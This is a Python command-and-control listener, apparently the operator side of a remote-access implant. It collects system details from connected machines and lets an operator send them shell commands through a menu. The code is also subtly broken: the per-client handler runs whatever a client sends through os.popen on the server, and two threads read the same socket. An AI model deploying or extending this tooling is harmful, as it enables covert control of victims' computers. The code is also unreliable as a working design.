import socket
import threading
import logging
import os
import json

# Load configuration
config_path = os.path.join(os.path.dirname(__file__), '../config/config.json')
with open(config_path) as config_file:
    config = json.load(config_file)

HOST = config['server_host']
PORT = config['server_port']
LOG_FILE = config['log_file']

# Configure logging
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(message)s')

# Store connected clients
clients = {}

def handle_client(client_socket, addr):
    with client_socket:
        client_id = f"{addr[0]}:{addr[1]}"
        try:
            # Receive and log system information from the client
            system_info = client_socket.recv(4096).decode('utf-8')
            logging.info(f"Connected to {client_id}")
            logging.info(f"System Information from {client_id}:\n{system_info}")
            print(f"[*] System Information from {client_id}:\n{system_info}")
            
            clients[client_id] = client_socket
            while True:
                command = client_socket.recv(1024).decode('utf-8')
                if command.lower() == 'exit':
                    print(f"[*] Client {client_id} has exited.")
                    break
                elif command:
                    response = os.popen(command).read()
                    client_socket.sendall(response.encode())
        except Exception as e:
            logging.error(f"Error handling client {client_id}: {e}")
            print(f"[!] Error: {e}")
        finally:
            del clients[client_id]
            client_socket.close()
            logging.info(f"Connection to {client_id} closed")

def start_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[*] Listening on {HOST}:{PORT}")

    while True:
        client_socket, addr = server.accept()
        client_id = f"{addr[0]}:{addr[1]}"
        print(f"[*] Accepted connection from {client_id}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket, addr))
        client_handler.start()

def show_menu():
    while True:
        print("\n--- C2 Server Menu ---")
        print("1. List active connections")
        print("2. Interact with a client")
        print("3. Exit")
        choice = input("Enter your choice: ")

        if choice == '1':
            list_connections()
        elif choice == '2':
            interact_with_client()
        elif choice == '3':
            break
        else:
            print("[!] Invalid choice. Please select a valid option.")

def list_connections():
    print("\n--- Active Connections ---")
    for client_id in clients:
        print(client_id)

def interact_with_client():
    client_id = input("Enter the client ID to interact with: ")
    if client_id in clients:
        client_socket = clients[client_id]
        while True:
            command = input(f"{client_id}> ")
            if command.lower() == 'exit':
                break
            client_socket.sendall(command.encode())
            response = client_socket.recv(4096).decode('utf-8')
            print(response)
    else:
        print(f"[!] No active connection with ID: {client_id}")

if __name__ == "__main__":
    listener_thread = threading.Thread(target=start_listener)
    listener_thread.daemon = True
    listener_thread.start()

    show_menu()
